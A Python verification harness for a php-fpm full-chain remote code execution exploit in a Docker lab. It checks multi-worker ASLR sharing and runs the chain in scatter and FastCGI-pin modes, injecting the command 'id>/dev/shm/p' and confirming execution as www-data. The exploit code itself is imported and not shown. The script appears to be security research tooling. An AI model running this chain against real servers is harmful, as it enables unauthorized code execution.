#!/usr/bin/env python3
"""Verifier for fpm_fullchain_multiworker.py on a multi-worker php-fpm pool.
Stands against a pm=static/max_children>=5 (or pm=dynamic) 8.5.11-fpm pool
behind nginx, with fpm's FastCGI port reachable for `pin` mode. Asserts the pool
is multi-worker and requests scatter, confirms fork-shared ASLR, runs the chain
N times per mode checking the out-of-band marker system('id') wrote, and
cross-checks the remote binbase against /proc (correctness only). Lab/analysis
use only.

Lab: the committed mwfpm profile -- a multi-worker 8.5.11-fpm pool (pm=static,
pm.max_children=6; container p2s-mwfpm-fpm) behind nginx on :8181 with fpm's
FastCGI port published on :9181 for `pin` mode. lab/mwfpm reuses lab/a7r5/html
(remote_app.php echo sink) and adds pid.php for the scatter check:

  docker compose -f docker-compose.fpm-avenues.yml --profile mwfpm up -d --build
  python3 -I poc/chains/verify_fpm_fullchain_multiworker.py \
      --container p2s-mwfpm-fpm --host 127.0.0.1 --port 8181 \
      --fcgi-port 9181 --runs 5 --mode both
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import socket
import subprocess
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    m = importlib.util.module_from_spec(spec)
    for _p in (_HERE, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    spec.loader.exec_module(m)
    return m


# proc_binbase below is custom (not from the lab helpers)
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.labharness import _dx  # noqa: E402


def worker_bases(container):
    """Return {pid: binbase} for each live 'pool www' worker from /proc."""
    rc, out = _dx(container, "sh", "-c",
                  'for p in /proc/[0-9]*/cmdline; do '
                  'if tr "\\0" " " < "$p" 2>/dev/null | grep -q "pool www"; then '
                  'pid=$(echo "$p" | sed "s#/proc/##;s#/cmdline##"); '
                  'bb=$(grep -m1 "php-fpm" /proc/$pid/maps | cut -d- -f1); '
                  'echo "$pid $bb"; fi; done')
    res = {}
    for line in out.splitlines():
        parts = line.split()
        if len(parts) == 2 and parts[1]:
            try:
                res[int(parts[0])] = int(parts[1], 16)
            except ValueError:
                pass
    return res


def scatter_pids(host, port, n=20):
    """Hit /pid.php n times (new conn each) -> set of serving pids."""
    pids = set()
    for _ in range(n):
        try:
            s = socket.create_connection((host, port), timeout=3)
            s.sendall(b"GET /pid.php HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
            resp = b""
            while True:
                c = s.recv(4096)
                if not c:
                    break
                resp += c
            s.close()
            hdr, _, body = resp.partition(b"\r\n\r\n")
            if b"chunked" in hdr.lower():
                # de-chunk: alternating <hexsize>\r\n<data>\r\n ... 0\r\n
                out = bytearray()
                i = 0
                while i < len(body):
                    j = body.find(b"\r\n", i)
                    if j < 0:
                        break
                    try:
                        sz = int(body[i:j].split(b";")[0], 16)
                    except ValueError:
                        break
                    if sz == 0:
                        break
                    out += body[j + 2:j + 2 + sz]
                    i = j + 2 + sz + 2
                body = bytes(out)
            pid = body.strip().decode(errors="replace")
            if pid.isdigit():
                pids.add(pid)
        except Exception:
            pass
    return pids


def proc_binbase(container):
    rc, out = _dx(container, "sh", "-c",
                  "grep -m1 php-fpm /proc/1/maps | cut -d- -f1")
    bases = worker_bases(container)
    if bases:
        # the workers' shared base is the ground truth (master pid 1 may differ)
        from collections import Counter
        return Counter(bases.values()).most_common(1)[0][0]
    try:
        return int(out.strip(), 16)
    except ValueError:
        return None


def main(argv=None):
    ap = argparse.ArgumentParser()
    ap.add_argument("--container", default="p2s-mwfpm-fpm")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8181)
    ap.add_argument("--fcgi-host", default="127.0.0.1")
    ap.add_argument("--fcgi-port", type=int, default=9181)
    ap.add_argument("--path", default="/remote_app.php")
    ap.add_argument("--marker", default="/dev/shm/p")
    ap.add_argument("--runs", type=int, default=5)
    ap.add_argument("--mode", choices=["scatter", "pin", "both"], default="both")
    args = ap.parse_args(argv)

    mw = _load("fpm_fullchain_multiworker", "fpm_fullchain_multiworker.py")

    # ---- pool shape / scatter / fork-shared ASLR ----
    bases = worker_bases(args.container)
    print(f"[verify] live 'pool www' workers: {len(bases)} "
          f"-> pids {sorted(bases)}")
    uniq_bases = set(bases.values())
    print(f"[verify] fork-shared ASLR: {len(uniq_bases)} distinct php-fpm base(s) "
          f"across {len(bases)} workers "
          f"({'SHARED' if len(uniq_bases) == 1 else 'NOT shared'})")
    pids = scatter_pids(args.host, args.port)
    print(f"[verify] scatter check: 20 /pid.php requests hit {len(pids)} "
          f"distinct workers {sorted(pids)}")
    if len(bases) < 2:
        print("[verify] ERROR: pool is NOT multi-worker; aborting.")
        return 3
    pbb = proc_binbase(args.container)
    print(f"[verify] /proc binbase (cross-check only, NOT fed in): "
          f"{hex(pbb) if pbb else 'n/a'}")

    modes = ["scatter", "pin"] if args.mode == "both" else [args.mode]
    overall = {}
    for mode in modes:
        uid_ok = 0
        leak_match = 0
        print("\n" + "#" * 64 + f"\n[verify] MODE = {mode}\n" + "#" * 64)
        for run in range(1, args.runs + 1):
            _dx(args.container, "sh", "-c", f"rm -f {args.marker}")
            t0 = time.time()
            if mode == "scatter":
                r = mw.run_scatter(args.host, args.port, args.path,
                                   f"id>{args.marker}", verbose=False)
            else:
                r = mw.run_pin(args.fcgi_host, args.fcgi_port, args.path,
                               f"id>{args.marker}", verbose=False)
            dt = time.time() - t0
            bb = (r or {}).get("binbase")
            if bb is not None and pbb is not None and bb == pbb:
                leak_match += 1
            time.sleep(0.4)
            rc, out = _dx(args.container, "sh", "-c",
                          f"cat {args.marker} 2>/dev/null")
            out = out.strip()
            ok = ("uid=" in out) and (("www-data" in out) or ("uid=33" in out))
            if ok:
                uid_ok += 1
            print(f"[verify] {mode} RUN {run}: marker={out!r} "
                  f"binbase=0x{(bb or 0):x} binbase==/proc={bb == pbb} "
                  f"elapsed={dt:.1f}s -> {'PASS' if ok else 'FAIL'}")
        overall[mode] = (uid_ok, leak_match)

    print("\n" + "=" * 64)
    print(f"[verify] SUMMARY over {args.runs} runs/mode, "
          f"{len(bases)}-worker pool:")
    rc_final = 0
    for mode, (uid_ok, leak_match) in overall.items():
        print(f"  mode={mode:8s}: marker uid=www-data {uid_ok}/{args.runs}  "
              f"| binbase==/proc {leak_match}/{args.runs}")
        if uid_ok != args.runs:
            rc_final = 1
    print("  NO /proc seed was fed into any exploit step.")
    return rc_final


if __name__ == "__main__":
    sys.exit(main())
